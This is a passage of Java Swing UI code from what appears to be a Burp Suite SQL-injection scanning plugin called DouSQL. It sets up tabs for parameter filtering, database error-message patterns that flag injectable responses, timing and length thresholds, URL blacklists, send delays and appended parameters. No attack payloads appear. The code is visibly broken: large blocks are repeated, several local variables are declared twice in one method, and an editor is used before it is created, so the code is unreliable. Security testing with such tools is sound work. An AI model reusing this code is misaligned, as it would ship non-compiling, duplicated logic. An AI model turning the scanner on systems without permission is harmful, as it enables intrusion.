        noFilterRadio = new JRadioButton("无过滤 (测试所有参数)", paramListMode == 0);
        whiteListRadio = new JRadioButton("白名单模式 (只测试配置参数)", paramListMode == 1);
        blackListRadio = new JRadioButton("黑名单模式 (跳过配置参数)", paramListMode == 2);
        ButtonGroup modeGroup = new ButtonGroup();
        modeGroup.add(noFilterRadio);
        modeGroup.add(whiteListRadio);
        modeGroup.add(blackListRadio);
        modePanel.add(noFilterRadio);
        modePanel.add(whiteListRadio);
        modePanel.add(blackListRadio);

        // 参数配置编辑区
        JPanel paramAreaPanel = new JPanel(new BorderLayout());
        JLabel paramListLabel = new JLabel("参数列表 (每行一个参数名)");
        paramListLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 5, 0));
        paramListTextArea = new JTextArea("", 15, 20);
        paramListTextArea.setForeground(Color.BLACK);
        paramListTextArea.setFont(new Font("宋体", Font.PLAIN, 13));
        paramListTextArea.setBackground(Color.WHITE);
        paramListTextArea.setEditable(true);
        JScrollPane paramListScrollPane = new JScrollPane(paramListTextArea);

        // 按钮区
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
        saveParamListBtn = new JButton("保存参数配置");
        buttonPanel.add(saveParamListBtn);

        paramAreaPanel.add(paramListLabel, BorderLayout.NORTH);
        paramAreaPanel.add(paramListScrollPane, BorderLayout.CENTER);
        paramAreaPanel.add(buttonPanel, BorderLayout.SOUTH);

        paramFilterPanel.add(modePanel, BorderLayout.NORTH);
        paramFilterPanel.add(paramAreaPanel, BorderLayout.CENTER);

        // 第三个标签页：自定义报错信息
        JPanel customErrorPanel = new JPanel(new BorderLayout());
        customErrorPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        enableCustomErrorCheckBox = new JCheckBox("启用自定义报错信息（配置文件：" + CONFIG_DIR + "/xia_SQL_diy_error.ini）", true);
        // 确保复选框在Windows下能完整显示
        enableCustomErrorCheckBox.setPreferredSize(new Dimension(400, 25));
        
        JPanel errorCheckPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        errorCheckPanel.add(enableCustomErrorCheckBox);
        customErrorPanel.add(errorCheckPanel, BorderLayout.NORTH);

        JPanel errorTextPanel = new JPanel(new BorderLayout());
        errorTextPanel.setBorder(BorderFactory.createEmptyBorder(5, 0, 0, 0));
        
        JLabel errorLabel = new JLabel("报错关键字配置 (每行一个关键字或正则表达式)");
        errorLabel.setBorder(BorderFactory.createEmptyBorder(0, 0, 5, 0));
        
        errorKeywordsTextArea = new JTextArea("ORA-\\d{5}\nSQL syntax.*?MySQL\nUnknown column\nSQL syntax\njava.sql.SQLSyntaxErrorException\nError SQL:\nSyntax error\n附近有语法错误\njava.sql.SQLException\n引号不完整\nSystem.Exception: SQL Execution Error!\ncom.mysql.jdbc\nMySQLSyntaxErrorException\nvalid MySQL result\nyour MySQL server version\nMySqlClient\nMySqlException\nvalid PostgreSQL result\nPG::SyntaxError:\norg.postgresql.jdbc\nPSQLException\nMicrosoft SQL Native Client error\nODBC SQL Server Driver\nSQLServer JDBC Driver\ncom.jnetdirect.jsql\nmacromedia.jdbc.sqlserver\ncom.microsoft.sqlserver.jdbc\nMicrosoft Access\nAccess Database Engine\nODBC Microsoft Access\nOracle error\nDB2 SQL error\nSQLite error\nSybase message\nSybSQLException", 18, 16);

        // 读取自定义报错信息配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_diy_error.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            errorKeywordsTextArea.setText(strData);
            // 更新列表
            updateErrorKeywordsList();
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        // 默认启用自定义报错信息
        enableCustomError = 1; // 设置为启用状态
        enableCustomErrorCheckBox.setSelected(true);

        errorKeywordsTextArea.setForeground(Color.BLACK);
        errorKeywordsTextArea.setFont(new Font("楷体", Font.BOLD, 16));
        errorKeywordsTextArea.setBackground(Color.WHITE);
        errorKeywordsTextArea.setEditable(true);
        JScrollPane errorScrollPane = new JScrollPane(errorKeywordsTextArea);

        saveErrorBtn = new JButton("保存报错信息配置");
        // 确保按钮在Windows下能完整显示
        saveErrorBtn.setPreferredSize(new Dimension(150, 30));
        
        JPanel errorButtonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        errorButtonPanel.add(saveErrorBtn);
        
        errorTextPanel.add(errorLabel, BorderLayout.NORTH);
        errorTextPanel.add(errorScrollPane, BorderLayout.CENTER);
        errorTextPanel.add(errorButtonPanel, BorderLayout.SOUTH);
        
        customErrorPanel.add(errorTextPanel, BorderLayout.CENTER);

        // 第四个标签页：响应时间阈值配置
        JPanel responseTimePanel = new JPanel(new BorderLayout());
        responseTimePanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel timeConfigPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        JLabel timeThresholdLabel = new JLabel("响应时间阈值（毫秒）:");
        responseTimeThresholdField = new JTextField(String.valueOf(responseTimeThreshold));
        saveResponseTimeThresholdBtn = new JButton("保存阈值设置");
        JLabel timeNoteLabel = new JLabel("注意：当自定义payload的响应时间超过此阈值时，会显示'time > N'");
        timeNoteLabel.setForeground(Color.GRAY);
        timeNoteLabel.setFont(new Font("宋体", Font.PLAIN, 12));

        timeConfigPanel.add(timeThresholdLabel);
        timeConfigPanel.add(responseTimeThresholdField);
        timeConfigPanel.add(new JLabel()); // 占位
        timeConfigPanel.add(saveResponseTimeThresholdBtn);
        timeConfigPanel.add(timeNoteLabel);
        timeConfigPanel.add(new JLabel()); // 占位

        responseTimePanel.add(timeConfigPanel, BorderLayout.NORTH);

        whiteTabbedPane.addTab("自定义SQL语句", customPayloadPanel);
        whiteTabbedPane.addTab("参数过滤配置", paramFilterPanel);
        whiteTabbedPane.addTab("自定义报错信息", customErrorPanel);
        whiteTabbedPane.addTab("响应时间阈值", responseTimePanel);

        // 第五个标签页：长度差异检测配置
        JPanel lengthDiffPanel = new JPanel(new BorderLayout());
        lengthDiffPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel diffConfigPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        JLabel diffThresholdLabel = new JLabel("长度差异阈值（字节）:");
        lengthDiffThresholdField = new JTextField(String.valueOf(lengthDiffThreshold));
        saveLengthDiffThresholdBtn = new JButton("保存阈值设置");
        JLabel diffNoteLabel = new JLabel("注意：当payload响应长度与原始长度差异超过此阈值时，会显示'diff: +N'或'diff: -N'");
        diffNoteLabel.setForeground(Color.GRAY);
        diffNoteLabel.setFont(new Font("宋体", Font.PLAIN, 12));

        diffConfigPanel.add(diffThresholdLabel);
        diffConfigPanel.add(lengthDiffThresholdField);
        diffConfigPanel.add(new JLabel()); // 占位
        diffConfigPanel.add(saveLengthDiffThresholdBtn);
        diffConfigPanel.add(diffNoteLabel);
        diffConfigPanel.add(new JLabel()); // 占位

        lengthDiffPanel.add(diffConfigPanel, BorderLayout.NORTH);

        // 第六个标签页：黑名单URL过滤配置
        JPanel blackListUrlPanel = new JPanel(new BorderLayout());
        blackListUrlPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel urlConfigPanel = new JPanel(new BorderLayout());
        JLabel urlListLabel = new JLabel("黑名单URL路径 (每行一个路径，支持通配符)");
        urlListLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 5, 0));
        blackListUrlTextArea = new JTextArea("/admin/*\n/static/*\n*.css\n*.js\n*.jpg\n*.jpeg\n*.png\n*.gif\n*.bmp\n*.svg\n*.ico\n*.woff\n*.woff2", 15, 20);
        blackListUrlTextArea.setForeground(Color.BLACK);
        blackListUrlTextArea.setFont(new Font("宋体", Font.PLAIN, 13));
        blackListUrlTextArea.setBackground(Color.WHITE);
        blackListUrlTextArea.setEditable(true);
        JScrollPane urlListScrollPane = new JScrollPane(blackListUrlTextArea);

        // 按钮区
        JPanel urlButtonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
        saveBlackListUrlBtn = new JButton("保存黑名单URL配置");
        urlButtonPanel.add(saveBlackListUrlBtn);

        urlConfigPanel.add(urlListLabel, BorderLayout.NORTH);
        urlConfigPanel.add(urlListScrollPane, BorderLayout.CENTER);
        urlConfigPanel.add(urlButtonPanel, BorderLayout.SOUTH);

        blackListUrlPanel.add(urlConfigPanel, BorderLayout.CENTER);

        // 第七个标签页：自定义延时发包配置
        JPanel delayConfigPanel = new JPanel(new BorderLayout());
        delayConfigPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // 延时模式选择
        JPanel delayModePanel = new JPanel(new GridLayout(3, 1, 5, 5));
        noDelayRadio = new JRadioButton("无延时 (立即发送)", delayMode == 0);
        fixedDelayRadio = new JRadioButton("固定延时", delayMode == 1);
        randomDelayRadio = new JRadioButton("随机延时", delayMode == 2);
        ButtonGroup delayModeGroup = new ButtonGroup();
        delayModeGroup.add(noDelayRadio);
        delayModeGroup.add(fixedDelayRadio);
        delayModeGroup.add(randomDelayRadio);
        delayModePanel.add(noDelayRadio);
        delayModePanel.add(fixedDelayRadio);
        delayModePanel.add(randomDelayRadio);

        // 延时配置面板
        JPanel delaySettingsPanel = new JPanel(new GridBagLayout());
        GridBagConstraints gbcDelay = new GridBagConstraints();
        gbcDelay.anchor = GridBagConstraints.WEST;
        gbcDelay.insets = new Insets(5, 5, 5, 5);

        // 固定延时配置
        gbcDelay.gridx = 0; gbcDelay.gridy = 0;
        delaySettingsPanel.add(new JLabel("固定延时时间(毫秒):"), gbcDelay);
        gbcDelay.gridx = 1;
        fixedDelayField = new JTextField(String.valueOf(fixedDelay), 10);
        delaySettingsPanel.add(fixedDelayField, gbcDelay);

        // 随机延时配置
        gbcDelay.gridx = 0; gbcDelay.gridy = 1;
        delaySettingsPanel.add(new JLabel("随机延时最小值(毫秒):"), gbcDelay);
        gbcDelay.gridx = 1;
        randomDelayMinField = new JTextField(String.valueOf(randomDelayMin), 10);
        delaySettingsPanel.add(randomDelayMinField, gbcDelay);

        gbcDelay.gridx = 0; gbcDelay.gridy = 2;
        delaySettingsPanel.add(new JLabel("随机延时最大值(毫秒):"), gbcDelay);
        gbcDelay.gridx = 1;
        randomDelayMaxField = new JTextField(String.valueOf(randomDelayMax), 10);
        delaySettingsPanel.add(randomDelayMaxField, gbcDelay);

        // 保存按钮
        gbcDelay.gridx = 0; gbcDelay.gridy = 3; gbcDelay.gridwidth = 2;
        saveDelayConfigBtn = new JButton("保存延时配置");
        delaySettingsPanel.add(saveDelayConfigBtn, gbcDelay);

        delayConfigPanel.add(delayModePanel, BorderLayout.NORTH);
        delayConfigPanel.add(delaySettingsPanel, BorderLayout.CENTER);

        // 第八个标签页：自定义追加参数配置
        JPanel appendParamsPanel = new JPanel(new BorderLayout());
        appendParamsPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // 启用追加参数复选框
        enableAppendParamsCheckBox = new JCheckBox("启用自定义追加参数", enableAppendParams);
        
        JPanel enablePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        enablePanel.add(enableAppendParamsCheckBox);

        // 主要配置区域 - 左右分割
        JSplitPane configSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        configSplitPane.setResizeWeight(0.6); // 左边占60%
        
        // 左侧：参数配置面板
        JPanel leftPanel = new JPanel(new BorderLayout());
        leftPanel.setBorder(BorderFactory.createTitledBorder("参数配置"));
        
        JLabel paramLabel = new JLabel("参数列表 (格式: key:value，一行一个):");
        leftPanel.add(paramLabel, BorderLayout.NORTH);
        
        appendParamsTextArea = new JTextArea(appendParamsText, 10, 25);
        appendParamsTextArea.setFont(new Font("Monospaced", Font.PLAIN, 12));
        appendParamsTextArea.setBorder(BorderFactory.createLoweredBevelBorder());
        
        // 添加文本变化监听器，实时更新右侧面板
        appendParamsTextArea.getDocument().addDocumentListener(new javax.swing.event.DocumentListener() {
            public void insertUpdate(javax.swing.event.DocumentEvent e) { updateParamTestPanel(); }
            public void removeUpdate(javax.swing.event.DocumentEvent e) { updateParamTestPanel(); }
            public void changedUpdate(javax.swing.event.DocumentEvent e) { updateParamTestPanel(); }
        });
        
        JScrollPane leftScrollPane = new JScrollPane(appendParamsTextArea);
        leftScrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        leftScrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        leftPanel.add(leftScrollPane, BorderLayout.CENTER);
        
        // 右侧：参数测试开关面板
        JPanel rightPanel = new JPanel(new BorderLayout());
        rightPanel.setBorder(BorderFactory.createTitledBorder("测试开关"));
        
        JLabel testLabel = new JLabel("选择参与payload测试的参数:");
        rightPanel.add(testLabel, BorderLayout.NORTH);
        
        paramTestPanel = new JPanel();
        paramTestPanel.setLayout(new BoxLayout(paramTestPanel, BoxLayout.Y_AXIS));
        
        JScrollPane rightScrollPane = new JScrollPane(paramTestPanel);
        rightScrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        rightScrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        rightPanel.add(rightScrollPane, BorderLayout.CENTER);
        
        configSplitPane.setLeftComponent(leftPanel);
        configSplitPane.setRightComponent(rightPanel);
        
        // 保存按钮
        JPanel appendParamsButtonPanel2 = new JPanel(new FlowLayout(FlowLayout.CENTER));
        saveAppendParamsBtn = new JButton("保存追加参数配置");
        appendParamsButtonPanel2.add(saveAppendParamsBtn);

        // 说明文本
        JTextArea helpText = new JTextArea("说明：\n" +
            "1. 启用后，会在每个请求中自动追加指定的参数\n" +
            "2. 支持URL参数、POST参数、JSON参数等格式\n" +
            "3. 参数格式：每行一个参数，使用 key:value 格式\n" +
            "4. 示例：token:abc123、debug:1、test:value\n" +
            "5. 右侧可单独控制每个参数是否参与payload测试\n" +
            "6. 不参与测试时避免重复检测，参与测试时可发现更多漏洞\n" +
            "7. 参数会根据请求格式自动适配添加方式", 8, 30);
        helpText.setEditable(false);
        helpText.setBackground(appendParamsPanel.getBackground());
        helpText.setFont(new Font("宋体", Font.PLAIN, 12));

        appendParamsPanel.add(enablePanel, BorderLayout.NORTH);
        appendParamsPanel.add(configSplitPane, BorderLayout.CENTER);
        
        // 将说明文本放在最下方
        JPanel bottomPanel = new JPanel(new BorderLayout());
        bottomPanel.add(appendParamsButtonPanel2, BorderLayout.NORTH);
        bottomPanel.add(helpText, BorderLayout.CENTER);
        appendParamsPanel.add(bottomPanel, BorderLayout.SOUTH);

        // 添加所有标签页到whiteTabbedPane
        whiteTabbedPane.addTab("自定义SQL语句", customPayloadPanel);
        whiteTabbedPane.addTab("参数过滤配置", paramFilterPanel);
        whiteTabbedPane.addTab("自定义报错信息", customErrorPanel);
        whiteTabbedPane.addTab("响应时间阈值", responseTimePanel);
        whiteTabbedPane.addTab("长度差异配置", lengthDiffPanel);
        whiteTabbedPane.addTab("黑名单URL过滤", blackListUrlPanel);
        whiteTabbedPane.addTab("延时发包配置", delayConfigPanel);
        whiteTabbedPane.addTab("追加参数配置", appendParamsPanel);

        // 事件监听器设置
        // 监听器逻辑
        chkbox1.addItemListener(e -> {
            if (chkbox1.isSelected()) {
                api.logging().logToOutput("插件DouSQL启动");
                switchs = 1;
            } else {
                api.logging().logToOutput("插件DouSQL关闭");
                switchs = 0;
            }
        });

        chkbox2.addItemListener(e -> {
            if (chkbox2.isSelected()) {
                api.logging().logToOutput("启动 监控Repeater");
                clicksRepeater = 64;
            } else {
                api.logging().logToOutput("关闭 监控Repeater");
                clicksRepeater = 0;
            }
        });

        chkbox3.addItemListener(e -> {
            if (chkbox3.isSelected()) {
                api.logging().logToOutput("启动 监控Proxy");
                clicksProxy = 4;
            } else {
                api.logging().logToOutput("关闭 监控Proxy");
                clicksProxy = 0;
            }
        });

        chkbox4.addItemListener(e -> {
            if (chkbox4.isSelected()) {
                api.logging().logToOutput("启动 值是数字则进行-1、-0");
                isInt = 1;
            } else {
                api.logging().logToOutput("关闭 值是数字则进行-1、-0");
                isInt = 0;
            }
        });

        chkbox8.addItemListener(e -> {
            if (chkbox8.isSelected()) {
                api.logging().logToOutput("启动 测试Cookie");
            } else {
                api.logging().logToOutput("关闭 测试Cookie");
            }
        });

        btn1.addActionListener(e -> {
            log.clear();
            log2.clear();
            log3.clear();
            log4Md5.clear();
            count = 0;
            fireTableRowsInserted(log.size(), log.size());
            model.fireTableRowsInserted(log3.size(), log3.size());
        });

        btn3.addActionListener(e -> {
            if (btn3.getText().equals("启动白名单")) {
                btn3.setText("关闭白名单");
                whiteURL = whiteTextField.getText();
                whiteSwitchs = 1;
                whiteTextField.setEditable(false);
                whiteTextField.setForeground(Color.GRAY);
            } else {
                btn3.setText("启动白名单");
                whiteSwitchs = 0;
                whiteTextField.setEditable(true);
                whiteTextField.setForeground(Color.BLACK);
            }
        });

        // 初始化payload组
        initializePayloadGroups();

        // 请求/响应查看器 - 改为左右分割布局
        // Montoya API创建消息编辑器
        api.logging().logToOutput("正在创建HTTP请求/响应编辑器...");
        
        // 声明变量
        JSplitPane requestResponseSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        JPanel requestPanel = new JPanel(new BorderLayout());
        JPanel responsePanel = new JPanel(new BorderLayout());
        
        try {
            // 验证编辑器组件是否创建成功
            if (requestViewer == null || responseViewer == null) {
                api.logging().logToOutput("错误: 无法创建HTTP请求/响应编辑器");
                api.logging().logToOutput("requestViewer: " + (requestViewer != null ? "OK" : "NULL"));
                api.logging().logToOutput("responseViewer: " + (responseViewer != null ? "OK" : "NULL"));
                return;
            }
            
            // 立即测试uiComponent()方法
            Component requestComponent = null;
            Component responseComponent = null;
            
            try {
                requestComponent = requestViewer.uiComponent();
            } catch (Exception e) {
                api.logging().logToOutput("获取请求编辑器UI组件时出错: " + e.getMessage());
            }
            
            try {
                responseComponent = responseViewer.uiComponent();
            } catch (Exception e) {
                api.logging().logToOutput("获取响应编辑器UI组件时出错: " + e.getMessage());
            }
            
            if (requestComponent == null || responseComponent == null) {
                api.logging().logToOutput("错误: HTTP编辑器的uiComponent()返回null");
                api.logging().logToOutput("requestComponent: " + (requestComponent != null ? "OK" : "NULL"));
                api.logging().logToOutput("responseComponent: " + (responseComponent != null ? "OK" : "NULL"));
                api.logging().logToOutput("这通常是由于Burp Suite版本不兼容或权限问题导致的");
                
                // 如果组件为null，创建备用的文本区域
                if (requestComponent == null) {
                    requestComponent = createFallbackPanel("请求编辑器加载失败");
                }
                if (responseComponent == null) {
                    responseComponent = createFallbackPanel("响应编辑器加载失败");
                }
            } else {
                api.logging().logToOutput("HTTP编辑器UI组件创建成功 (使用READ_ONLY选项)");
            }
            
            // 创建请求面板
            requestPanel.setBorder(BorderFactory.createTitledBorder("Request"));
            requestPanel.add(requestComponent, BorderLayout.CENTER);
            
            // 创建响应面板
            responsePanel.setBorder(BorderFactory.createTitledBorder("Response"));
            responsePanel.add(responseComponent, BorderLayout.CENTER);
            
        } catch (Exception e) {
            api.logging().logToOutput("创建HTTP编辑器时发生异常: " + e.getMessage());
            e.printStackTrace();
            
            // 创建错误提示面板
            requestPanel.setBorder(BorderFactory.createTitledBorder("Request (Error)"));
            requestPanel.add(createFallbackPanel("请求编辑器创建失败"), BorderLayout.CENTER);
            
            responsePanel.setBorder(BorderFactory.createTitledBorder("Response (Error)"));
            responsePanel.add(createFallbackPanel("响应编辑器创建失败"), BorderLayout.CENTER);
        }
        
        // 添加到分割面板
        requestResponseSplitPane.setLeftComponent(requestPanel);
        requestResponseSplitPane.setRightComponent(responsePanel);
        requestResponseSplitPane.setDividerLocation(0.5); // 对半分割
        requestResponseSplitPane.setResizeWeight(0.5); // 调整大小时保持对半分割

        // 应用主题到组件 - 扩展主题应用
        api.userInterface().applyThemeToComponent(splitPane);
        api.userInterface().applyThemeToComponent(logTable);
        api.userInterface().applyThemeToComponent(controlPanel);
        api.userInterface().applyThemeToComponent(requestResponseSplitPane);
        api.userInterface().applyThemeToComponent(requestPanel);
        api.userInterface().applyThemeToComponent(responsePanel);
        api.userInterface().applyThemeToComponent(tablesSplitPane);
        api.userInterface().applyThemeToComponent(whiteTabbedPane);

        // 恢复正确的三层布局结构
        // 创建分割面板变量
        JSplitPane splitPanes = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        JSplitPane splitPanes2 = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        
        // 第一层：splitPanes2 - 右侧面板的上下分割（控制面板 + 标签页）
        splitPanes2.setTopComponent(controlPanel); // 上面：控制面板
        splitPanes2.setBottomComponent(whiteTabbedPane); // 下面：标签页
        splitPanes2.setOrientation(JSplitPane.VERTICAL_SPLIT);
        splitPanes2.setDividerLocation(280); // 控制面板高度280像素
        splitPanes2.setResizeWeight(0.0); // 控制面板固定大小

        // 第二层：splitPanes - 主内容区域的上下分割（表格 + 请求响应）
        splitPanes.setTopComponent(mainPanel); // 上面：主表格区域
        splitPanes.setBottomComponent(requestResponseSplitPane); // 下面：请求响应查看器
        splitPanes.setOrientation(JSplitPane.VERTICAL_SPLIT);

        whiteTabbedPane.addTab("自定义SQL语句", customPayloadPanel);
        whiteTabbedPane.addTab("参数过滤配置", paramFilterPanel);
        whiteTabbedPane.addTab("自定义报错信息", customErrorPanel);
        whiteTabbedPane.addTab("响应时间阈值", responseTimePanel);
        whiteTabbedPane.addTab("长度差异配置", lengthDiffPanel);
        whiteTabbedPane.addTab("黑名单URL过滤", blackListUrlPanel);
        whiteTabbedPane.addTab("延时发包配置", delayConfigPanel);
        whiteTabbedPane.addTab("追加参数配置", appendParamsPanel);

        // 将标签页从控制面板中移除，因为它会单独放在splitPanes2的底部
        // controlPanel只包含控制选项，不包含标签页
        // controlPanel.add(whiteTabbedPane, BorderLayout.SOUTH); // 注释掉这行

        

        // 事件监听器
        setupEventListeners();

        // 请求/响应查看器 - 改为左右分割布局
        // Montoya API创建消息编辑器
        api.logging().logToOutput("正在创建HTTP请求/响应编辑器...");
        
        // 声明变量
        JSplitPane requestResponseSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        JPanel requestPanel = new JPanel(new BorderLayout());
        JPanel responsePanel = new JPanel(new BorderLayout());
        
        try {
            // 尝试使用READ_ONLY选项创建编辑器
            requestViewer = api.userInterface().createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = api.userInterface().createHttpResponseEditor(EditorOptions.READ_ONLY);
            
            // 验证编辑器组件是否创建成功
            if (requestViewer == null || responseViewer == null) {
                api.logging().logToOutput("错误: 无法创建HTTP请求/响应编辑器");
                api.logging().logToOutput("requestViewer: " + (requestViewer != null ? "OK" : "NULL"));
                api.logging().logToOutput("responseViewer: " + (responseViewer != null ? "OK" : "NULL"));
                return;
            }
            
            // 立即测试uiComponent()方法
            Component requestComponent = null;
            Component responseComponent = null;
            
            try {
                requestComponent = requestViewer.uiComponent();
            } catch (Exception e) {
                api.logging().logToOutput("获取请求编辑器UI组件时出错: " + e.getMessage());
            }
            
            try {
                responseComponent = responseViewer.uiComponent();
            } catch (Exception e) {
                api.logging().logToOutput("获取响应编辑器UI组件时出错: " + e.getMessage());
            }
            
            if (requestComponent == null || responseComponent == null) {
                api.logging().logToOutput("错误: HTTP编辑器的uiComponent()返回null");
                api.logging().logToOutput("requestComponent: " + (requestComponent != null ? "OK" : "NULL"));
                api.logging().logToOutput("responseComponent: " + (responseComponent != null ? "OK" : "NULL"));
                api.logging().logToOutput("这通常是由于Burp Suite版本不兼容或权限问题导致的");
                
                // 如果组件为null，创建备用的文本区域
                if (requestComponent == null) {
                    JTextArea fallbackRequest = new JTextArea("请求编辑器加载失败\n\n可能的原因：\n1. Burp Suite版本不兼容\n2. 权限问题\n3. 插件加载时机问题\n\n请检查Burp Suite输出面板的错误信息");
                    fallbackRequest.setEditable(false);
                    fallbackRequest.setFont(new Font("Monospaced", Font.PLAIN, 12));
                    requestComponent = new JScrollPane(fallbackRequest);
                }
                if (responseComponent == null) {
                    JTextArea fallbackResponse = new JTextArea("响应编辑器加载失败\n\n可能的原因：\n1. Burp Suite版本不兼容\n2. 权限问题\n3. 插件加载时机问题\n\n请检查Burp Suite输出面板的错误信息");
                    fallbackResponse.setEditable(false);
                    fallbackResponse.setFont(new Font("Monospaced", Font.PLAIN, 12));
                    responseComponent = new JScrollPane(fallbackResponse);
                }
            } else {
                api.logging().logToOutput("HTTP编辑器UI组件创建成功 (使用READ_ONLY选项)");
            }
            
            // 创建请求面板
            requestPanel.setBorder(BorderFactory.createTitledBorder("Request"));
            requestPanel.add(requestComponent, BorderLayout.CENTER);
            
            // 创建响应面板
            responsePanel.setBorder(BorderFactory.createTitledBorder("Response"));
            responsePanel.add(responseComponent, BorderLayout.CENTER);
            
            // 不再需要额外的标签页，直接使用Burp原生的响应查看器
            // 如果需要备用显示，可以在响应设置失败时在日志中提示用户
            
        } catch (Exception e) {
            api.logging().logToOutput("创建HTTP编辑器时发生异常: " + e.getMessage());
            e.printStackTrace();
            
            // 创建错误提示面板
            JTextArea errorRequest = new JTextArea("请求编辑器创建失败\n\n异常信息: " + e.getMessage());
            errorRequest.setEditable(false);
            requestPanel.setBorder(BorderFactory.createTitledBorder("Request (Error)"));
            requestPanel.add(new JScrollPane(errorRequest), BorderLayout.CENTER);
            
            JTextArea errorResponse = new JTextArea("响应编辑器创建失败\n\n异常信息: " + e.getMessage());
            errorResponse.setEditable(false);
            responsePanel.setBorder(BorderFactory.createTitledBorder("Response (Error)"));
            responsePanel.add(new JScrollPane(errorResponse), BorderLayout.CENTER);
        }
        
        // 添加到分割面板
        requestResponseSplitPane.setLeftComponent(requestPanel);
        requestResponseSplitPane.setRightComponent(responsePanel);
        requestResponseSplitPane.setDividerLocation(0.5); // 对半分割
        requestResponseSplitPane.setResizeWeight(0.5); // 调整大小时保持对半分割

        // 应用主题到组件 - 扩展主题应用
        api.userInterface().applyThemeToComponent(splitPane);
        api.userInterface().applyThemeToComponent(logTable);
        api.userInterface().applyThemeToComponent(scrollPane);
        api.userInterface().applyThemeToComponent(payloadScrollPane);
        api.userInterface().applyThemeToComponent(controlPanel);
        api.userInterface().applyThemeToComponent(mainPanel);
        api.userInterface().applyThemeToComponent(requestResponseSplitPane);
        api.userInterface().applyThemeToComponent(requestPanel);
        api.userInterface().applyThemeToComponent(responsePanel);
        api.userInterface().applyThemeToComponent(tablesSplitPane);
        api.userInterface().applyThemeToComponent(leftTablePanel);
        api.userInterface().applyThemeToComponent(rightTablePanel);
        api.userInterface().applyThemeToComponent(whiteTabbedPane);

        // 恢复正确的三层布局结构
        // 第一层：splitPanes2 - 右侧面板的上下分割（控制面板 + 标签页）
        splitPanes2.setTopComponent(controlPanel); // 上面：控制面板
        splitPanes2.setBottomComponent(whiteTabbedPane); // 下面：标签页
        splitPanes2.setOrientation(JSplitPane.VERTICAL_SPLIT);
        splitPanes2.setDividerLocation(280); // 控制面板高度280像素
        splitPanes2.setResizeWeight(0.0); // 控制面板固定大小

        // 第二层：splitPanes - 主内容区域的上下分割（表格 + 请求响应）
        splitPanes.setTopComponent(mainPanel); // 上面：主表格区域
        splitPanes.setBottomComponent(requestResponseSplitPane); // 下面：请求响应查看器
        splitPanes.setOrientation(JSplitPane.VERTICAL_SPLIT);
        splitPanes.setDividerLocation(400); // 表格区域高度400像素
        splitPanes.setResizeWeight(0.6); // 表格区域占60%

        // 第三层：splitPane - 整体的左右分割（主内容 + 右侧面板）
        splitPane.setLeftComponent(splitPanes); // 左侧：主内容区域
        splitPane.setRightComponent(splitPanes2); // 右侧：控制面板+标签页
        splitPane.setOrientation(JSplitPane.HORIZONTAL_SPLIT);
        splitPane.setDividerLocation(1000); // 主内容区域宽度1000像素
        splitPane.setResizeWeight(0.75); // 左侧内容区域占75%
        
        // 设置分割面板的最小和最大尺寸，防止意外拖拽
        splitPanes2.setMinimumSize(new Dimension(250, 400)); // 右侧最小宽度250像素
        splitPanes.setMinimumSize(new Dimension(600, 400));  // 左侧最小宽度600像素

        // 注册标签页
        api.userInterface().registerSuiteTab("DouSQL", splitPane);
        
        // 测试编辑器功能
        SwingUtilities.invokeLater(() -> {
            try {
                Thread.sleep(1000); // 等待UI完全初始化
                testEditorFunctionality();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });
    }

    // Windows系统UI优化
    private void optimizeUIForWindows() {
        try {
            // 检测操作系统
            String osName = System.getProperty("os.name").toLowerCase();
            if (osName.contains("windows")) {
                // 优化DPI设置
                System.setProperty("sun.java2d.dpiaware", "true");
                System.setProperty("sun.java2d.uiScale", "1.0");
                
                // 设置字体渲染优化
                System.setProperty("awt.useSystemAAFontSettings", "on");
                System.setProperty("swing.aatext", "true");
                
                // 设置Swing组件的默认字体大小
                java.util.Enumeration<Object> keys = UIManager.getDefaults().keys();
                while (keys.hasMoreElements()) {
                    Object key = keys.nextElement();
                    Object value = UIManager.get(key);
                    if (value instanceof Font) {
                        Font font = (Font) value;
                        UIManager.put(key, new Font(font.getName(), font.getStyle(), Math.max(font.getSize(), 12)));
                    }
                }
                
                api.logging().logToOutput("已应用Windows系统UI优化");
            }
        } catch (Exception e) {
            api.logging().logToOutput("Windows UI优化失败: " + e.getMessage());
        }
    }

    private void setupEventListeners() {
        // 监听器逻辑
        chkbox1.addItemListener(e -> {
            if (chkbox1.isSelected()) {
                api.logging().logToOutput("插件DouSQL启动");
                switchs = 1;
            } else {
                api.logging().logToOutput("插件DouSQL关闭");
                switchs = 0;
            }
        });

        chkbox2.addItemListener(e -> {
            if (chkbox2.isSelected()) {
